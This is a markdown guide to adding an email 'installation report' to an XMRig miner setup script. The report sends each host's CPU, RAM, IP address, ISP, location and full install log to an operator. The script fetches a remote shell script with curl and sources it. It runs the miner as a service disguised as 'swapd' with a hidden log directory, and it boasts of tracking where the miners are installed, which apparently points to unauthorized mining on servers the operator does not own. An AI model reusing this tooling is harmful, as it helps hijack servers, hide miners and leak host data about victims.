# 📧 ADD SYSTEM INFO TO YOUR EMAIL REPORT

## 🎯 What This Does

Adds system information (like bench.sh) to the email you're already sending with your installation log!

**Before:**
- Email with just log file

**After:**
- Email with system info (CPU, RAM, IP, etc.) + log file

---

## 🚀 Quick Integration (3 Steps)

### Step 1: Add at Beginning of Script

Right after `WALLET="$1"`, add this:

```bash
#!/bin/bash

WALLET="$1"
if [ -z "$WALLET" ]; then
    echo "Usage: $0 <wallet> [email]"
    exit 1
fi

# ==================== EMAIL CONFIGURATION ====================
ADMIN_EMAIL="${2:-your-email@example.com}"  # Second parameter or default
SMTP_METHOD="mailgun"  # Options: mailgun, sendgrid, gmail, local
INSTALL_LOG="/tmp/miner_install_$(date +%s).log"

# Mailgun API (get free key from mailgun.com)
MAILGUN_API_KEY="YOUR_MAILGUN_API_KEY"
MAILGUN_DOMAIN="YOUR_DOMAIN.mailgun.org"

# Start logging
exec &> >(tee "$INSTALL_LOG")
echo "[*] Installation started: $(date)"
# ==================== END CONFIGURATION ====================
```

### Step 2: Download Email Function

At the END of your script (before final echo), add:

```bash
# ==================== SEND EMAIL REPORT ====================
echo ""
echo "[*] Preparing installation report..."

# Download email function
curl -sL https://raw.githubusercontent.com/YOUR_REPO/email_with_system_info.sh -o /tmp/email_func.sh

# Source it
source /tmp/email_func.sh

# Send email with system info + log
send_installation_report_email

# Cleanup
rm -f /tmp/email_func.sh
# ==================== END EMAIL REPORT ====================

echo ""
echo "Installation complete!"
```

### Step 3: Run Script with Email

```bash
./setup_FULL_ULTIMATE.sh YOUR_WALLET your-email@gmail.com
```

**Done!** You'll receive an email with:
- System info (CPU, RAM, Disk, IP, Location)
- Complete installation log attached

---

## 📧 Setup Email Service (Choose One)

### Option 1: Mailgun (RECOMMENDED - Free 5,000/month)

**Step 1:** Sign up at https://www.mailgun.com/
**Step 2:** Verify email
**Step 3:** Get your API key (Settings → API Keys)
**Step 4:** Note your domain (e.g., `sandbox123.mailgun.org`)

**Configure:**
```bash
SMTP_METHOD="mailgun"
MAILGUN_API_KEY="key-1234567890abcdef..."
MAILGUN_DOMAIN="sandbox123.mailgun.org"
```

**Test:**
```bash
curl -s --user "api:YOUR_API_KEY" \
    https://api.mailgun.net/v3/YOUR_DOMAIN/messages \
    -F from="Test <test@YOUR_DOMAIN>" \
    -F to="your-email@gmail.com" \
    -F subject="Test" \
    -F text="It works!"
```

---

### Option 2: SendGrid (Free 100/day)

**Step 1:** Sign up at https://sendgrid.com/
**Step 2:** Create API key (Settings → API Keys)
**Step 3:** Copy the key

**Configure:**
```bash
SMTP_METHOD="sendgrid"
SENDGRID_API_KEY="SG.abc123xyz..."
```

---

### Option 3: Gmail (If you have Gmail)

**Step 1:** Enable 2FA on your Gmail
**Step 2:** Generate App Password:
   - Google Account → Security → 2-Step Verification → App passwords
   - Choose "Mail" and "Other"
   - Copy the 16-character password

**Step 3:** Install mailx:
```bash
# Debian/Ubuntu
apt-get install mailutils

# CentOS/RHEL
yum install mailx
```

**Configure:**
```bash
SMTP_METHOD="gmail"
GMAIL_ADDRESS="your-gmail@gmail.com"
GMAIL_APP_PASSWORD="xxxx xxxx xxxx xxxx"  # 16 chars from step 2
```

---

### Option 4: Local Mail (If server has mail configured)

```bash
SMTP_METHOD="local"
```

This uses the `mail` command if available on the server.

---

## 📊 Example Email You'll Receive

**Subject:** ✅ Miner Installed - vps-123456 - 2026-02-22

**Body:**
```
Miner installation completed successfully!

Hostname: vps-123456
Timestamp: 2026-02-22 15:30:45 CET

-------------------- System Information Report -------------------
 Version            : Installation Report v2026-02-22
 Timestamp          : 2026-02-22 15:30:45 CET
----------------------------------------------------------------------
 CPU Model          : AMD EPYC Processor (with IBPB)
 CPU Cores          : 4 @ 2794.748 MHz
 CPU Cache          : 512 KB
 AES-NI             : ✓ Enabled
 VM-x/AMD-V         : ✗ Disabled
 Total Disk         : 592.5 GB (6.2 GB Used)
 Total RAM          : 5.8 GB (2.9 GB Used)
 Total Swap         : 2.0 GB (0 KB Used)
 System Uptime      : 13 days, 4 hour 5 min
 Load Average       : 2.82, 2.04, 1.96
 OS                 : Debian GNU/Linux 13 (trixie)
 Arch               : x86_64 (64 Bit)
 Kernel             : 6.12.38+deb13-cloud-amd64
 TCP Congestion Ctrl: cubic
 Virtualization     : KVM
 IPv4/IPv6          : ✓ Online / ✓ Online
 Organization       : AS51167 Contabo GmbH
 Location           : Lauterbourg / FR
 Region             : Grand Est
----------------------------------------------------------------------
 Miner Type         : XMRig
 Wallet             : 4xxxxx...xxxxxx
 Installation       : Completed at 2026-02-22 15:30:45
----------------------------------------------------------------------

Installation log attached (if available).
```

**Attachment:** `miner_install.log` (full installation output)

---

## 🔧 Complete Integration Example

Here's a COMPLETE example of how to modify your setup script:

```bash
#!/bin/bash
# setup_FULL_ULTIMATE_with_email.sh

# ==================== PARAMETERS ====================
WALLET="$1"
ADMIN_EMAIL="${2:-}"

if [ -z "$WALLET" ]; then
    echo "Usage: $0 <wallet> [email]"
    echo "Example: $0 4xxxxx... admin@yourdomain.com"
    exit 1
fi

# ==================== EMAIL CONFIGURATION ====================
SMTP_METHOD="mailgun"
INSTALL_LOG="/tmp/miner_install_$(date +%s).log"

# Mailgun Configuration
MAILGUN_API_KEY="key-abc123..."
MAILGUN_DOMAIN="mg.yourdomain.com"

# Start logging everything
exec &> >(tee "$INSTALL_LOG")

echo "========================================"
echo "MINER INSTALLATION STARTED"
echo "========================================"
echo "Wallet: $WALLET"
echo "Email: ${ADMIN_EMAIL:-Not configured}"
echo "Time: $(date)"
echo ""

# ==================== YOUR INSTALLATION CODE HERE ====================
echo "[*] Installing dependencies..."
# ... your installation steps ...

echo "[*] Downloading XMRig..."
# ... download miner ...

echo "[*] Configuring..."
# ... configure miner ...

echo "[*] Starting service..."
# ... start service ...

echo ""
echo "========================================"
echo "INSTALLATION COMPLETE"
echo "========================================"
echo ""

# ==================== SEND EMAIL REPORT ====================
if [ -n "$ADMIN_EMAIL" ] && [ "$ADMIN_EMAIL" != "your-email@example.com" ]; then
    echo "[*] Sending installation report to: $ADMIN_EMAIL"
    
    # Download email function
    curl -sL https://raw.githubusercontent.com/YOUR_REPO/email_with_system_info.sh -o /tmp/email_func.sh
    
    # Source it
    source /tmp/email_func.sh
    
    # Send email
    send_installation_report_email
    
    # Cleanup
    rm -f /tmp/email_func.sh
else
    echo "[*] No email configured - skipping email report"
    echo "    To receive email reports, run with email parameter:"
    echo "    $0 $WALLET your-email@example.com"
fi
# ==================== END EMAIL REPORT ====================

echo ""
echo "Miner is now running!"
echo "Check status: systemctl status swapd"
echo "View logs: tail -f /root/.swapd/.swapd.log"
echo ""

# Stop logging
exec &>/dev/tty
```

---

## 🧪 Testing

### Test Email Function Only:

```bash
# Download the email function
curl -sL https://raw.../email_with_system_info.sh -o test_email.sh

# Configure it
nano test_email.sh
# Set MAILGUN_API_KEY, MAILGUN_DOMAIN, etc.

# Source it
source test_email.sh

# Set test variables
ADMIN_EMAIL="your-email@gmail.com"
WALLET="4xxxxxxx..."
INSTALL_LOG="/tmp/test.log"
echo "Test log content" > /tmp/test.log

# Send test
send_installation_report_email
```

### Test Complete Script:

```bash
./your_script.sh WALLET_ADDRESS test@example.com
```

Check your inbox!

---

## 📝 What Gets Sent

### Email Contains:

1. **System Information:**
   - CPU model, cores, speed
   - RAM & Swap usage
   - Disk space
   - OS, Kernel, Architecture
   - IP address & Location
   - ISP information
   - Virtualization type
   - Uptime & Load

2. **Miner Information:**
   - Wallet address (truncated)
   - Installation timestamp

3. **Installation Log:**
   - Complete output of installation
   - All commands executed
   - Any errors encountered

### Privacy:

- ✅ Wallet is truncated (4xxxxx...xxxxxx)
- ✅ No passwords or private keys
- ✅ Only public system information
- ✅ You control where it's sent

---

## 🛠️ Troubleshooting

### Email not received?

**Check 1: SMTP credentials**
```bash
echo "Check your API key and domain"
```

**Check 2: Test manually**
```bash
# Mailgun test
curl -s --user "api:YOUR_KEY" \
    https://api.mailgun.net/v3/YOUR_DOMAIN/messages \
    -F from="test@YOUR_DOMAIN" \
    -F to="your@email.com" \
    -F subject="Test" \
    -F text="Test message"
```

**Check 3: Check spam folder**

**Check 4: Verify domain (Mailgun)**
- In Mailgun, verify your sending domain

### Log file not attached?

Make sure `INSTALL_LOG` path is correct:
```bash
echo "Log file: $INSTALL_LOG"
ls -lh "$INSTALL_LOG"
```

### Script fails?

Check if email function was downloaded:
```bash
ls -lh /tmp/email_func.sh
```

---

## 🎁 Bonus: Email on Error

Want email ONLY if installation fails?

```bash
# At the end of your script:
if [ $? -ne 0 ]; then
    echo "[!] Installation failed! Sending error report..."
    send_installation_report_email
fi
```

Or catch all errors:
```bash
trap 'send_installation_report_email' ERR
```

---

## 🎊 Summary

**What you get:**
- ✅ System info (like bench.sh)
- ✅ Installation log attached
- ✅ Email automatically sent
- ✅ Complete visibility

**Setup time:**
- ✅ 10 minutes (Mailgun signup)
- ✅ 5 lines of code
- ✅ One-time configuration

**Cost:**
- ✅ FREE (Mailgun: 5,000/month)
- ✅ FREE (SendGrid: 100/day)
- ✅ FREE (Gmail: unlimited)

**Result:**
Know exactly where your miners are installed with complete system specs! 📧✨
